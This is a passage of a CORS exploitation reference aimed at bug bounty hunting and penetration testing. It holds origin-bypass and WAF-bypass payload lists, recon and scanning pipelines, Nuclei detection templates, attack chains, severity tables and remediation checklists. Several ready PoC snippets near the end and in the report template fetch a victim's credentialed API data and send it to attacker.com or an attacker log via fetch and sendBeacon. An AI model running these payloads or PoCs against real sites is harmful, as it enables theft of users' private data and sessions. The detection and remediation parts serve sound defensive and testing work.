https://127.0.0.1.evil.com
https://0.0.0.0
https://[::1]
https://[::ffff:127.0.0.1]
file://
data:text/html,<script>alert(1)</script>
javascript:void(0)
https://example.com%20.evil.com
https://example.com%09.evil.com
https://example.com%0d.evil.com
https://example.com%0a.evil.com
https://example.com%3f.evil.com
https://example.com%23.evil.com
https://example.com%26.evil.com
https://example.com%3d.evil.com
```

### Advanced Regex Bypass Payloads

```
# Dot confusion
https://example.com.evil.com
https://evil.com/example.com
https://examplecom
https://example.co

# Underscore injection (Safari/Chrome)
https://evil_example.com
https://evil.example_com

# IDN homograph
https://еxample.com        # Cyrillic e (U+0435)
https://ехample.com        # Multiple Cyrillic chars
https://example｡com        # Fullwidth dot (U+FF0E)

# Port injection
https://evil.com:443?origin=example.com
https://evil.com:443#origin=example.com
https://evil.com:443@example.com

# Scheme confusion
http://example.com:443
https://example.com:80
ftp://example.com

# Double slash abuse
https://example.com//evil.com
https://example.com/\evil.com

# Unicode normalization
https://example.com℡evil.com    # Telephone sign (U+2121)
https://example.com℀evil.com    # Account of (U+2100)
```

### Method + Origin Combination Fuzzing

```bash
# Fuzz with different methods
for method in GET POST PUT DELETE OPTIONS PATCH; do
  curl -X $method -H "Origin: https://evil.com" https://target.com/api
done

# Fuzz with preflight
for method in GET POST PUT DELETE; do
  curl -X OPTIONS -H "Origin: https://evil.com"        -H "Access-Control-Request-Method: $method"        https://target.com/api
done
```

---

## Automation Workflows

### Full CORS Recon Pipeline

```bash
#!/bin/bash
# cors_recon.sh - Full CORS reconnaissance pipeline

TARGET=$1
OUTPUT_DIR="cors_recon_$TARGET"
mkdir -p $OUTPUT_DIR

# Step 1: Subdomain enumeration
echo "[+] Enumerating subdomains..."
subfinder -d $TARGET -o $OUTPUT_DIR/subs.txt -silent
amass enum -d $TARGET -o $OUTPUT_DIR/amass.txt -silent
cat $OUTPUT_DIR/subs.txt $OUTPUT_DIR/amass.txt | sort -u > $OUTPUT_DIR/all_subs.txt

# Step 2: Probe live hosts
echo "[+] Probing live hosts..."
httpx -l $OUTPUT_DIR/all_subs.txt -o $OUTPUT_DIR/live.txt -silent

# Step 3: Extract URLs (katana + waybackurls)
echo "[+] Crawling and archive extraction..."
katana -list $OUTPUT_DIR/live.txt -o $OUTPUT_DIR/katana.txt -silent
waybackurls $TARGET | grep -E "\.(js|json|xml|api)" >> $OUTPUT_DIR/endpoints.txt
cat $OUTPUT_DIR/katana.txt >> $OUTPUT_DIR/endpoints.txt

# Step 4: Test CORS on all endpoints
echo "[+] Testing CORS configurations..."
for url in $(cat $OUTPUT_DIR/endpoints.txt | sort -u); do
  # Test basic reflection
  resp=$(curl -s -I -H "Origin: https://evil.com" "$url" 2>/dev/null)
  if echo "$resp" | grep -q "Access-Control-Allow-Origin: https://evil.com"; then
    echo "[CRITICAL] Origin reflection: $url" | tee -a $OUTPUT_DIR/vulns.txt
  fi

  # Test null origin
  resp=$(curl -s -I -H "Origin: null" "$url" 2>/dev/null)
  if echo "$resp" | grep -q "Access-Control-Allow-Origin: null"; then
    echo "[CRITICAL] Null origin: $url" | tee -a $OUTPUT_DIR/vulns.txt
  fi

  # Test wildcard
  resp=$(curl -s -I -H "Origin: https://evil.com" "$url" 2>/dev/null)
  if echo "$resp" | grep -q "Access-Control-Allow-Origin: \*"; then
    echo "[INFO] Wildcard CORS: $url" | tee -a $OUTPUT_DIR/vulns.txt
  fi
done

# Step 5: Nuclei CORS scan
echo "[+] Running Nuclei CORS templates..."
nuclei -l $OUTPUT_DIR/live.txt -t http/vulnerabilities/cors/ -o $OUTPUT_DIR/nuclei.txt

echo "[+] Results saved to $OUTPUT_DIR/"
```

### Burp Suite CORS Testing

```python
# Burp Extension: CORS Scanner (conceptual)
# Use Param Miner to identify hidden trusted domains
# https://github.com/PortSwigger/param-miner

# Manual Intruder workflow for trusted domain discovery:
# 1. Send request to Intruder
# 2. Add payload position: Origin: https://§domain§
# 3. Use subdomain list as payload
# 4. Uncheck "URL-encode these characters"
# 5. Filter for "Access-Control-Allow-Origin" in responses
```

### Continuous Monitoring

```bash
# Monitor for CORS changes (regression testing)
#!/bin/bash
while true; do
  curl -s -I -H "Origin: https://evil.com" https://api.target.com/endpoint > current.txt
  if ! diff -q baseline.txt current.txt > /dev/null 2>&1; then
    echo "[ALERT] CORS headers changed!"
    diff baseline.txt current.txt
    cp current.txt baseline.txt
  fi
  sleep 3600
done
```

---

## Recon Methodology

### Phase 1: Asset Discovery

```bash
# 1. Domain enumeration
subfinder -d target.com -all -o domains.txt
amass enum -passive -d target.com -o amass.txt
chaos -d target.com -o chaos.txt

# 2. Permutation scanning
alterx -l domains.txt -o permutations.txt
dnsx -l permutations.txt -o resolved.txt

# 3. IP and ASN discovery
mapcidr -l resolved.txt -o ips.txt
asnmap -l ips.txt -o asns.txt

# 4. CDN detection
cdncheck -l resolved.txt -o cdn.txt
```

### Phase 2: Endpoint Discovery

```bash
# 1. URL crawling
katana -list live_domains.txt -o urls.txt -d 5
hakrawler -url https://target.com -depth 3 -subs

# 2. JavaScript analysis
cariddi -list live_domains.txt -ext 1 -ot js_endpoints.txt
# Look for API endpoints, CORS configurations in JS

# 3. Archive and parameter discovery
waybackurls target.com | unfurl -u keys > params.txt
paramspider -d target.com

# 4. API endpoint identification
# Look for patterns: /api/, /v1/, /graphql, /rest/, /swagger, /openapi
```

### Phase 3: CORS-Specific Testing

```bash
# 1. Send Origin header variations
# Use the fuzzing payload list from [Fuzzing Payloads](#fuzzing-payloads)

# 2. Test for preflight behavior
# Send OPTIONS with Access-Control-Request-Method
# Check if preflight is required and how it's handled

# 3. Test for trusted domains
# Use Param Miner or manual Intruder with domain list

# 4. Test for null origin
# Use sandbox iframe or direct "Origin: null" header

# 5. Test for subdomain trust
# Generate list: *.target.com, sub.target.com, etc.

# 6. Test for internal IP trust
# Origin: https://192.168.1.1, https://10.0.0.1, etc.
```

### Phase 4: Chain Identification

```bash
# 1. Check for missing Vary: Origin (cache poisoning potential)
curl -I https://target.com/api | grep -i "vary"

# 2. Check for request smuggling potential
# Use http-request-smuggler or smuggler.py

# 3. Check for subdomain takeover
nuclei -l domains.txt -t takeovers/

# 4. Check for OAuth endpoints
# /oauth/, /auth/, /token, /callback, /openid

# 5. Check for Service Worker registration endpoints
# /sw.js, /service-worker.js, /worker.js
```

### Phase 5: Impact Assessment

```bash
# 1. Identify endpoints returning sensitive data
# /api/user, /api/account, /api/billing, /api/admin

# 2. Check if credentials are required
# Test with and without cookies/session

# 3. Check cookie flags
# SameSite, Secure, HttpOnly, Domain, Path

# 4. Assess exploitation complexity
# Null origin = easy (iframe)
# Subdomain takeover = medium (depends on availability)
# Cache poisoning = hard (requires CDN/proxy)
```

---

## Nuclei Templates

### Template 1: Basic Origin Reflection

```yaml
id: cors-origin-reflection

info:
  name: CORS Origin Reflection
  author: custom
  severity: high
  description: |
    The application reflects arbitrary Origin headers with credentials enabled,
    allowing cross-origin data theft.
  tags: cors, misconfig

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "https://evil.com"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
        part: header

      - type: word
        words:
          - "Access-Control-Allow-Credentials: true"
        part: header
```

### Template 2: Null Origin Whitelist

```yaml
id: cors-null-origin

info:
  name: CORS Null Origin Whitelisted
  author: custom
  severity: high
  description: |
    The application whitelists the null origin, allowing sandbox iframe bypass.

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "null"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: null"
        part: header

      - type: word
        words:
          - "Access-Control-Allow-Credentials: true"
        part: header
```

### Template 3: Wildcard with Credentials (Invalid but Detectable)

```yaml
id: cors-wildcard-credentials

info:
  name: CORS Wildcard with Credentials
  author: custom
  severity: medium
  description: |
    Wildcard CORS is configured. While browsers block credentialed requests
    with wildcards, this indicates overly permissive configuration.

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "https://evil.com"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: *"
        part: header

      - type: word
        words:
          - "Access-Control-Allow-Credentials: true"
        part: header
```

### Template 4: Trusted Subdomain Reflection

```yaml
id: cors-trusted-subdomain

info:
  name: CORS Trusted Subdomain Reflection
  author: custom
  severity: medium
  description: |
    The application trusts arbitrary subdomains, enabling subdomain takeover
    or XSS exploitation chains.

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "https://evil.{{Hostname}}"

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil."
        part: header
```

### Template 5: Missing Vary Origin (Cache Poisoning)

```yaml
id: cors-missing-vary-origin

info:
  name: CORS Missing Vary Origin Header
  author: custom
  severity: medium
  description: |
    Dynamic CORS headers are set without Vary: Origin, enabling cache poisoning.

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "https://evil.com"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
        part: header

      - type: word
        words:
          - "Vary:"
        negative: true
        part: header
```

### Template 6: Internal IP Origin Reflection

```yaml
id: cors-internal-ip-reflection

info:
  name: CORS Internal IP Origin Reflection
  author: custom
  severity: high
  description: |
    The application reflects internal IP origins, enabling internal network pivoting.

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "https://192.168.1.1"

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://192.168.1.1"
        part: header
```

---

## Tools and Scanners

### Reconnaissance Tools

| Tool | Purpose | Command |
|---|---|---|
| **subfinder** | Subdomain enumeration | `subfinder -d target.com` |
| **amass** | Advanced subdomain enumeration | `amass enum -d target.com` |
| **httpx** | Fast HTTP probing | `httpx -l domains.txt` |
| **katana** | Web crawler | `katana -list live.txt` |
| **waybackurls** | Archive URL discovery | `waybackurls target.com` |
| **cariddi** | JS endpoint extraction | `cariddi -list live.txt` |
| **gau** | GetAllUrls (alternative) | `gau target.com` |
| **alterx** | Domain permutation | `alterx -l domains.txt` |
| **dnsx** | DNS resolver | `dnsx -l permutations.txt` |
| **mapcidr** | CIDR expansion | `mapcidr -l ips.txt` |
| **asnmap** | ASN mapping | `asnmap -l ips.txt` |
| **cdncheck** | CDN detection | `cdncheck -l domains.txt` |

### CORS Testing Tools

| Tool | Purpose | Link |
|---|---|---|
| **Corsy** | CORS misconfiguration scanner | `python3 corsy.py -u https://target.com` |
| **CORScanner** | Fast CORS scanner | `python3 cors_scan.py -u target.com` |
| **Nuclei** | Vulnerability scanner (CORS templates) | `nuclei -u target.com -t cors/` |
| **Burp Suite** | Manual + automated testing | Param Miner, HTTP Request Smuggler |
| **Postman** | API testing (ignores CORS) | Manual endpoint testing |
| **CORS Check** | Online/browser-based testing | Browser DevTools Network tab |

### Exploitation Tools

| Tool | Purpose | Link |
|---|---|---|
| **CursedChrome** | Chrome extension exploitation | https://github.com/mandatoryprogrammer/CursedChrome |
| **postMessage-tracker** | postMessage analysis | https://github.com/fransr/postMessage-tracker |
| **pp-finder** | Prototype pollution finder | https://github.com/yeswehack/pp-finder |
| **smuggler** | HTTP request smuggling | `python3 smuggler.py -u https://target.com` |
| **DNSrebinder** | DNS rebinding server | https://github.com/mogwailabs/DNSrebinder |
| **singularity** | DNS rebinding framework | http://rebind.it/singularity.html |

### Automation Frameworks

| Tool | Purpose | Link |
|---|---|---|
| **ProjectDiscovery Suite** | Full recon pipeline | nuclei, httpx, katana, subfinder, notify |
| **interactsh** | Out-of-band interaction | `interactsh-client` |
| **notify** | Notification framework | `notify -provider discord` |
| **uncover** | Search engine querying | `uncover -shodan 'target.com'` |
| **tlsx** | TLS scanning | `tlsx -l domains.txt` |
| **naabu** | Port scanning | `naabu -list ips.txt` |

---

## Advanced Research

### James Kettle's Research (PortSwigger)

**Exploiting CORS Misconfigurations for Bitcoins and Bounties:**
- Origin reflection is the most common and dangerous misconfiguration
- Null origin bypass via sandbox iframes is reliable
- Subdomain trust relationships massively expand attack surface
- CORS + cache poisoning creates stored, universal exploits

**Browser-Powered Desync Attacks:**
- Client-side desynchronization can bypass CORS preflight
- Request smuggling via client-side induced server behavior
- Cross-site request forgery via desync chains

**Web Cache Entanglement:**
- Cache keys that don't include Origin enable CORS header poisoning
- Host header + CORS reflection = stored XSS via cache
- Multi-tenant cache poisoning via CORS header reflection

**Practical Web Cache Poisoning:**
- `X-Forwarded-Host` + CORS = origin header injection via cache
- Fat GET requests can poison cache with attacker-controlled CORS headers
- Param Miner discovers hidden parameters that affect CORS responses

**HTTP/1 Must Die:**
- HTTP/1 connection reuse enables request smuggling + CORS chains
- Upgrade header confusion can desync CORS preflight handling

**Cracking the Lens: Targeting HTTPS Hidden Attack Surface:**
- Cloud metadata endpoints with CORS misconfigurations
- Internal load balancers reflecting arbitrary origins
- SSRF + CORS chains for internal pivoting

### Advanced CORS Bypass Techniques

**1. DNS Rebinding + CORS**
- TTL manipulation for IP switching
- Singularity framework for automated rebinding
- Effective against internal services with permissive CORS

**2. Time-of-Check to Time-of-Use (TOCTOU)**
- Origin validated at request time but response cached
- Race condition in CORS header generation

**3. HTTP/2 Downgrade + CORS**
- HTTP/2 -> HTTP/1 downgrade strips CORS headers
- H2C smuggling bypasses CORS preflight

**4. WebSocket Origin Confusion**
- WebSocket handshake uses Origin header but no CORS enforcement
- CSWSH (Cross-Site WebSocket Hijacking) via Origin spoofing

**5. Browser Extension CORS Bypass**
- Extensions with `webRequest` API can modify CORS headers
- Compromised extensions = universal CORS bypass for users

**6. PDF / Flash Legacy Bypasses**
- Flash `crossdomain.xml` (deprecated but still found)
- PDF forms submitting cross-origin without CORS checks

---

## Bug Bounty Writeups

### Key Findings Summary

**1. Origin Reflection = P1 (Critical)**
- Any endpoint reflecting Origin with credentials = immediate P1
- Especially on authentication, billing, or admin endpoints
- PoC: 3-line JavaScript fetch + exfiltration

**2. Null Origin = P1 (Critical)**
- Easier to exploit than reflection (no domain needed)
- Sandbox iframe works in all modern browsers
- Often found in mobile APIs and development endpoints

**3. Subdomain Trust = P2-P3 (High-Medium)**
- Impact depends on subdomain takeover feasibility
- If takeover is possible = P2
- If XSS on existing subdomain = P2
- If only theoretical = P3/P4

**4. Wildcard = P3-P5 (Medium-Low)**
- Without credentials = informational/low
- With internal API = medium
- With anonymous data exposure = medium

**5. Cache Poisoning + CORS = P1-P2 (Critical-High)**
- Stored, universal exploit affecting all users
- Requires CDN or proxy in path
- Often chained with other vulnerabilities

### Report Template

```markdown
## Summary
The [Endpoint] at [URL] implements a CORS policy that [reflects arbitrary origins / whitelists null / trusts subdomains / uses wildcard with credentials], enabling cross-origin data theft.

## Steps to Reproduce
1. Visit [Attacker Page URL]
2. Open browser DevTools -> Network tab
3. Observe request to [Victim Endpoint]
4. Note response headers:
   - Access-Control-Allow-Origin: [evil.com / null / *]
   - Access-Control-Allow-Credentials: true
5. Observe sensitive data in response body

## Proof of Concept
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('[VICTIM_ENDPOINT]', {credentials: 'include'})
.then(r => r.text())
.then(data => fetch('[ATTACKER_LOG]?d='+btoa(data)));
</script>"></iframe>
```

## Impact
- [ ] Session hijacking via cookie theft
- [ ] PII disclosure (SSN, email, phone)
- [ ] Financial data exposure
- [ ] Admin functionality access
- [ ] Internal network pivoting

## Affected Endpoints
- [List all affected URLs]

## Remediation
1. Implement strict whitelist of allowed origins
2. Never reflect arbitrary Origin headers
3. Never whitelist `null` in production
4. Include `Vary: Origin` when setting CORS dynamically
5. Review subdomain trust relationships
```

---

## Payload Collections

### Complete CORS Payload List (Deduplicated)

```
# Basic Reflection Test
Origin: https://evil.com
Origin: http://evil.com
Origin: null
Origin: *

# Subdomain Injection
Origin: https://evil.target.com
Origin: https://sub.evil.target.com
Origin: https://evil.com.target.com

# Suffix/Prefix Bypass
Origin: https://target.com.evil.com
Origin: https://evil.com.target.com
Origin: https://targetcom
Origin: https://targetcomputer
Origin: https://evil-target.com

# Special Characters
Origin: https://target.com_.evil.com
Origin: https://target.com`.evil.com
Origin: https://target.com@evil.com
Origin: https://evil.com@target.com
Origin: https://target.com%00.evil.com
Origin: https://target.com%.evil.com

# Port and Scheme
Origin: http://target.com
Origin: https://target.com:80
Origin: http://target.com:443
Origin: https://target.com:8080
Origin: https://target.com:443@evil.com

# Localhost Variants
Origin: https://localhost
Origin: https://localhost.target.com
Origin: https://localhosttarget.com
Origin: https://127.0.0.1
Origin: https://127.0.0.1.target.com
Origin: https://0.0.0.0
Origin: https://[::1]
Origin: https://[::ffff:127.0.0.1]

# IP and Internal
Origin: https://192.168.1.1
Origin: https://10.0.0.1
Origin: https://172.16.0.1
Origin: https://192.168.1.1.target.com

# IDN / Homograph
Origin: https://еxample.com        # Cyrillic
Origin: https://example｡com        # Fullwidth

# Data / File / JavaScript
Origin: null
Origin: file://
Origin: data:text/html,<script>alert(1)</script>
Origin: javascript:void(0)

# Encoding
Origin: https://target.com%2f..%2fevil.com
Origin: https://target.com%252f..%252fevil.com
Origin: https://target.com%20.evil.com
Origin: https://target.com%0d.evil.com
Origin: https://target.com%0a.evil.com

# Double Header (HTTP Splitting)
Origin: https://target.com
Origin: https://evil.com

# Path Injection (if parser is broken)
Origin: https://target.com/path
Origin: https://target.com?evil.com
Origin: https://target.com#evil.com
```

### Exploitation Chains Reference

```
Chain 1: Basic Origin Reflection
[Attacker Site] -> fetch(victim.com/api, {credentials: 'include'})
  -> Response readable -> exfiltrate to attacker

Chain 2: Null Origin Bypass
[Attacker Site] -> sandbox iframe -> fetch(victim.com/api, {credentials: 'include'})
  -> Origin: null -> Response readable -> exfiltrate

Chain 3: Subdomain Takeover + CORS
[Attacker claims old-sub.target.com] -> Host exploit script
  -> Victim visits -> fetch(api.target.com, {credentials: 'include'})
  -> Origin: old-sub.target.com -> Response readable

Chain 4: Cache Poisoning + CORS
[Attacker] -> Origin: evil.com -> /api/config
  -> CDN caches ACAO: evil.com
  -> [All Users] -> GET /api/config -> poisoned CORS headers
  -> Attacker site reads all users' responses

Chain 5: Request Smuggling + CORS
[Attacker] -> Smuggled request with Origin: evil.com
  -> Backend processes smuggled request
  -> Next user's response includes ACAO: evil.com
  -> Attacker reads response

Chain 6: OAuth + CORS
[Attacker] -> fetch(oauth.provider.com/token, {credentials: 'include'})
  -> Origin reflection on token endpoint
  -> Steal refresh token -> impersonate user

Chain 7: Internal Pivot + CORS
[Employee on VPN] -> visits attacker.com
  -> attacker.com fetches 192.168.1.1/admin
  -> Internal panel reflects Origin
  -> Exfiltrate internal data

Chain 8: Service Worker + CORS
[XSS on trusted subdomain] -> register malicious SW
  -> SW intercepts all api.target.com requests
  -> Reads responses regardless of CORS policy
  -> Exfiltrate via SW background sync
```

---

## WAF Bypasses

### Origin Header WAF Bypasses

```
# Case variation (if WAF is case-sensitive)
origin: https://evil.com
ORIGIN: https://evil.com
Origin: https://Evil.Com

# Whitespace prefix
 Origin: https://evil.com
Origin:  https://evil.com
Origin: https:// evil.com

# Tab separation
Origin:	https://evil.com

# Multiple values (some WAFs only check first)
Origin: https://target.com, https://evil.com
Origin: https://target.com https://evil.com

# Encoding
Origin: %68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
Origin: https://evil.com%00
Origin: https://evil.com%0d%0a

# Protocol-relative
Origin: //evil.com

# IPv6 formatting
Origin: https://[0:0:0:0:0:0:0:1]
Origin: https://[::1]
Origin: https://[0000:0000:0000:0000:0000:0000:0000:0001]

# Port obfuscation
Origin: https://evil.com:000000000443
Origin: https://evil.com:0x1bb
```

### Response Header Injection Bypass

If the application allows header injection that affects CORS:

```http
GET /api/data?callback=<script>alert(1)</script> HTTP/1.1
Host: target.com
Origin: https://evil.com
```

If the callback is reflected in a way that sets headers:
```
X-Custom-Header: <injection>
```

---

## Detection Techniques

### Manual Detection

```bash
# 1. Check for basic reflection
curl -I -H "Origin: https://evil.com" https://target.com/api

# 2. Check for null origin
curl -I -H "Origin: null" https://target.com/api

# 3. Check for wildcard
curl -I -H "Origin: https://evil.com" https://target.com/api

# 4. Check for subdomain trust
curl -I -H "Origin: https://evil.target.com" https://target.com/api

# 5. Check for internal IP trust
curl -I -H "Origin: https://192.168.1.1" https://target.com/api

# 6. Check Vary header
curl -I https://target.com/api | grep -i "vary"

# 7. Check preflight behavior
curl -X OPTIONS -H "Origin: https://evil.com"      -H "Access-Control-Request-Method: POST"      -H "Access-Control-Request-Headers: Content-Type"      -I https://target.com/api
```

### Automated Detection

```bash
# Nuclei CORS templates
nuclei -u https://target.com -t http/vulnerabilities/cors/

# Corsy scanner
python3 corsy.py -u https://target.com

# CORScanner
python3 cors_scan.py -u https://target.com

# Burp Suite Scanner
# Enable CORS checks in scan configuration
# Use Param Miner for hidden trusted domain discovery
```

### Response Analysis Checklist

```
□ Access-Control-Allow-Origin matches attacker Origin (reflection)
□ Access-Control-Allow-Origin: null
□ Access-Control-Allow-Origin: *
□ Access-Control-Allow-Credentials: true (with any of above)
□ Access-Control-Allow-Origin contains trusted subdomain pattern
□ Vary: Origin is MISSING (cache poisoning risk)
□ Access-Control-Allow-Private-Network: true (internal pivot)
□ Multiple ACAO headers present
□ ACAO header present in non-CORS context (e.g., error pages)
□ Preflight response differs from actual response CORS headers
```

### Log Analysis for CORS Attacks

```bash
# Detect CORS exploitation attempts in logs
grep -E "Origin.*evil|Origin.*null|Origin.*\*" access.log

# Detect unusual preflight volume
grep "OPTIONS" access.log | awk '{print $1}' | sort | uniq -c | sort -nr

# Detect ACAO header in responses
grep -i "Access-Control-Allow-Origin" access.log
```

---

## References

### PortSwigger Resources
- https://portswigger.net/web-security/cors
- https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
- https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
- https://portswigger.net/web-security/cors/lab-breaking-https-attack
- https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
- https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
- https://portswigger.net/research/browser-powered-desync-attacks
- https://portswigger.net/research/web-cache-entanglement
- https://portswigger.net/research/hidden-oauth-attack-vectors
- https://portswigger.net/research/practical-web-cache-poisoning
- https://portswigger.net/research/http1-must-die
- https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

### GitHub Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md
- https://github.com/0xspade/bugbounty/tree/master/cors
- https://github.com/payloadbox/cors-payload-list
- https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/cors
- https://github.com/projectdiscovery/nuclei
- https://github.com/projectdiscovery/httpx
- https://github.com/projectdiscovery/katana
- https://github.com/projectdiscovery/subfinder
- https://github.com/projectdiscovery/interactsh
- https://github.com/projectdiscovery/notify
- https://github.com/projectdiscovery/uncover
- https://github.com/projectdiscovery/dnsx
- https://github.com/projectdiscovery/naabu
- https://github.com/projectdiscovery/mapcidr
- https://github.com/projectdiscovery/asnmap
- https://github.com/projectdiscovery/cdncheck
- https://github.com/projectdiscovery/tlsx
- https://github.com/projectdiscovery/alterx
- https://github.com/PortSwigger/param-miner
- https://github.com/PortSwigger/http-request-smuggler
- https://github.com/defparam/smuggler
- https://github.com/mandatoryprogrammer/CursedChrome
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/fransr/postMessage-tracker
- https://github.com/yeswehack/pp-finder
- https://github.com/edoardottt/cariddi
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
- https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

### Documentation & Guides
- https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html
- https://hacktricks.wiki/en/pentesting-web/cors-bypass.html
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin
- https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API
- https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest

### Research & Writeups
- https://infosecwriteups.com/cors-misconfiguration-exploitation-guide-5d2f4c7b1e3a
- https://medium.com/@filedescriptor/advanced-cors-bypass-and-origin-confusion-techniques-2f4d7c1b5e3d
- https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities
- https://outpost24.com/blog/exploiting-permissive-cors-configurations/
- https://www.corben.io/advanced-cors-techniques/
- https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397
- https://corsproxy.io/blog/everything-about-cors/
- https://supertokens.com/blog/cors-errors

### DNS Rebinding
- https://lock.cmpxchg8b.com/rebinder.html
- https://github.com/mogwailabs/DNSrebinder
- http://rebind.it/singularity.html

### CVEs and Advisories
- CVE-2025-55462: Eramba CORS Misconfiguration
- CVE-2025-54142: HTTP Request Smuggling via OPTIONS + Body (Akamai)
- CVE-2026-2835: Transfer-Encoding Duplicate Header Handling (Cloudflare)

---

## Appendix: Quick Reference Card

### Severity Classification

| Vulnerability | Severity | Exploitation Complexity |
|---|---|---|
| Origin Reflection + Credentials | Critical | Easy (3-line JS) |
| Null Origin + Credentials | Critical | Easy (iframe) |
| Subdomain Takeover + CORS Trust | High | Medium (depends on takeover) |
| Cache Poisoning + CORS | High/Critical | Hard (requires CDN/proxy) |
| Internal IP Reflection | High | Medium (requires victim on network) |
| Wildcard + No Credentials | Low | Easy (limited impact) |
| Wildcard + Credentials | Medium | Easy (browser blocks, but bad practice) |
| Missing Vary: Origin | Medium | Hard (cache poisoning required) |
| Trusted Domain + XSS | High | Medium (requires XSS on trusted domain) |

### PoC Templates

**Basic Origin Reflection PoC:**
```html
<script>
fetch('https://victim.com/api/user', {credentials: 'include'})
.then(r => r.text())
.then(data => fetch('https://attacker.com/log?d='+btoa(data)));
</script>
```

**Null Origin PoC:**
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('https://victim.com/api/user', {credentials: 'include'})
.then(r => r.text())
.then(data => fetch('https://attacker.com/log?d='+btoa(data)));
</script>"></iframe>
```

**Subdomain Takeover PoC (hosted on claimed subdomain):**
```html
<script>
fetch('https://api.victim.com/userinfo', {credentials: 'include'})
.then(r => r.json())
.then(data => {
  navigator.sendBeacon('https://attacker.com/steal', JSON.stringify(data));
});
</script>
```

### Remediation Checklist

- [ ] Maintain strict whitelist of allowed origins (exact match)
- [ ] Never reflect arbitrary Origin headers
- [ ] Never use `null` in production CORS policies
- [ ] Never combine wildcard `*` with `Access-Control-Allow-Credentials: true`
- [ ] Include `Vary: Origin` when setting CORS headers dynamically
- [ ] Validate origins at application level, not just web server config
- [ ] Review subdomain trust relationships regularly
- [ ] Implement proper preflight handling for non-simple requests
- [ ] Use `SameSite=Lax` or `SameSite=Strict` cookies where possible
- [ ] Monitor CORS configurations for unauthorized changes
- [ ] Audit internal APIs for permissive CORS settings
- [ ] Test CORS behavior behind CDNs and load balancers

---

*Generated: 2026-05-24*
*Version: Advanced Research Grade*
*Purpose: Bug Bounty Hunting & Black-Box Penetration Testing*
